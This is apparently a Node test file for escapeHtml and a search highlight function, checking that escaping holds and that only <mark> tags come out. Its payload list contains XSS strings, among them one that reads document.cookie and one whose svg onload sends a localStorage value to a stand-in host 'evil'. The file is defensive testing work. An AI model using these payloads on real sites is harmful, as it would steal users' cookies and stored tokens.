// Tests for src/lib/escapeHtml.js and src/features/search/highlight.js.
// Run: node scripts/escape.test.mjs (Node 18+).
import assert from 'node:assert/strict';
import { escapeHtml } from '../src/lib/escapeHtml.js';
import { highlight } from '../src/features/search/highlight.js';

// Any output must contain no tag except our own <mark>/</mark>.
const onlyMarkTags = (html) => !/[<>]/.test(html.replace(/<\/?mark>/g, ''));

// ── escapeHtml
assert.equal(escapeHtml('a & b < c > d " e \' f'), 'a &amp; b &lt; c &gt; d &quot; e &#39; f');
assert.equal(escapeHtml(null), '');
assert.equal(escapeHtml(undefined), '');
assert.equal(escapeHtml(42), '42');
assert.equal(escapeHtml('Senate Building'), 'Senate Building');
console.log('ok: escapeHtml escapes & < > " \' and tolerates null/numbers');

// ── highlight: normal behaviour unchanged
assert.equal(highlight('Senate Building', 'sen'), '<mark>Sen</mark>ate Building', 'keeps original case');
assert.equal(highlight('Library Library', 'lib'), '<mark>Lib</mark>rary <mark>Lib</mark>rary', 'multiple matches');
assert.equal(highlight('Senate', ''), 'Senate');
assert.equal(highlight('Senate', undefined), 'Senate');
assert.equal(highlight('Senate', 'xyz'), 'Senate', 'no match');
assert.equal(highlight('Café (main)', '(main'), 'Café <mark>(main</mark>)', 'regex chars in query are literal');
assert.equal(highlight('a.b', '.'), 'a<mark>.</mark>b');
assert.equal(highlight(null, 'x'), '');
console.log('ok: highlight behaviour preserved');

// ── highlight: hostile names cannot introduce elements
const payloads = [
  '<img src=x onerror=alert(1)>',
  '<script>alert(document.cookie)</script>',
  '"><svg/onload=fetch("//evil/"+localStorage.getItem("k"))>',
  "'-alert(1)-'",
  '<a href="javascript:alert(1)">x</a>',
  '<mark onmouseover=alert(1)>hi</mark>',
];
for (const p of payloads) {
  for (const q of ['', 'x', 'img', 'alert', 'a', '<', '<img']) {
    const out = highlight(p, q);
    assert.ok(onlyMarkTags(out), `unsafe output for ${JSON.stringify(p)} / q=${JSON.stringify(q)}: ${out}`);
  }
}
console.log('ok: no payload x query combination produces a tag other than <mark>');

// ── entity edge case: query inside an escaped entity must not corrupt it
assert.equal(highlight('Tom & Jerry', 'amp'), 'Tom &amp; Jerry', '"amp" must not match inside &amp;');
assert.equal(highlight('Tom & Jerry', '&'), 'Tom <mark>&amp;</mark> Jerry');
assert.equal(highlight('a<b', 'lt'), 'a&lt;b', '"lt" must not match inside &lt;');
console.log('ok: matching happens on raw text, so entities are never split');
